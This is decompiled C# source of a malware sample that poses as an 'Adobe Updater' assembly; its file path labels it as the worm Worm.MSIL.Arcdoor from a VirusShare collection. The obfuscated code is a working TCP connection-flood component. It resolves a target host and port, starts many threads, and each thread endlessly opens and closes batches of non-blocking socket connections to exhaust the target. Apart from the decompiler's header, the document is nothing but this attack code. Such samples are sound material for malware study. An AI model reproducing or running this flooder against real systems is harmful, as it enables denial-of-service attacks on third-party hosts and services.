// Decompiled with JetBrains decompiler
// Type:  
// Assembly: Adobe Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3EBFD65F-C01D-4B08-A6E5-41C787EE6341
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Worm.MSIL.Arcdoor.vps-5c5e242af096e77e0fc4a037a0fee5d20df072b9dc640e5ae36ec0f0f68ad065.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

internal sealed class \u0003\u2001
{
  private static ThreadStart[] \u0002;
  private static Thread[] \u0003;
  public static string \u0005;
  private static IPEndPoint \u0008;
  public static int \u0006;
  private static \u0003\u2001.\u0002[] \u000E;
  public static int \u000F;
  public static int \u0002\u2000;
  public static bool \u0003\u2000;

  public static void \u0002()
  {
    try
    {
      \u0003\u2001.\u0008 = new IPEndPoint(Dns.GetHostEntry(\u0003\u2001.\u0005).AddressList[0], \u0003\u2001.\u0006);
    }
    catch
    {
      \u0003\u2001.\u0008 = new IPEndPoint(IPAddress.Parse(\u0003\u2001.\u0005), \u0003\u2001.\u0006);
    }
    \u0003\u2001.\u0003 = new Thread[\u0003\u2001.\u0002\u2000];
    \u0003\u2001.\u0002 = new ThreadStart[\u0003\u2001.\u0002\u2000];
    \u0003\u2001.\u000E = new \u0003\u2001.\u0002[\u0003\u2001.\u0002\u2000];
    for (int index = 0; index < \u0003\u2001.\u0002\u2000; ++index)
    {
      \u0003\u2001.\u000E[index] = new \u0003\u2001.\u0002(\u0003\u2001.\u0008, \u0003\u2001.\u000F);
      \u0003\u2001.\u0002[index] = new ThreadStart(\u0003\u2001.\u000E[index].\u0002);
      \u0003\u2001.\u0003[index] = new Thread(\u0003\u2001.\u0002[index]);
      \u0003\u2001.\u0003[index].Start();
    }
  }

  public static void \u0003()
  {
    for (int index = 0; index < \u0003\u2001.\u0002\u2000; ++index)
    {
      try
      {
        \u0003\u2001.\u0003[index].Suspend();
      }
      catch
      {
      }
    }
  }

  private sealed class \u0002
  {
    private IPEndPoint \u0002;
    private Socket[] \u0003;
    private int \u0005;

    public \u0002(IPEndPoint _param1, int _param2)
    {
      this.\u0002 = _param1;
      this.\u0005 = _param2;
    }

    public void \u0002(IAsyncResult _param1)
    {
    }

    public void \u0002()
    {
label_0:
      try
      {
        while (true)
        {
          this.\u0003 = new Socket[this.\u0005];
          for (int index = 0; index < this.\u0005; ++index)
          {
            this.\u0003[index] = new Socket(this.\u0002.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            this.\u0003[index].Blocking = false;
            AsyncCallback callback = new AsyncCallback(this.\u0002);
            this.\u0003[index].BeginConnect((EndPoint) this.\u0002, callback, (object) this.\u0003[index]);
          }
          Thread.Sleep(100);
          for (int index = 0; index < this.\u0005; ++index)
          {
            if (this.\u0003[index].Connected)
              this.\u0003[index].Disconnect(false);
            this.\u0003[index].Close();
            this.\u0003[index] = (Socket) null;
          }
          this.\u0003 = (Socket[]) null;
        }
      }
      catch
      {
        for (int index = 0; index < this.\u0005; ++index)
        {
          try
          {
            if (this.\u0003[index].Connected)
              this.\u0003[index].Disconnect(false);
            this.\u0003[index].Close();
            this.\u0003[index] = (Socket) null;
          }
          catch
          {
          }
        }
        goto label_0;
      }
    }
  }
}
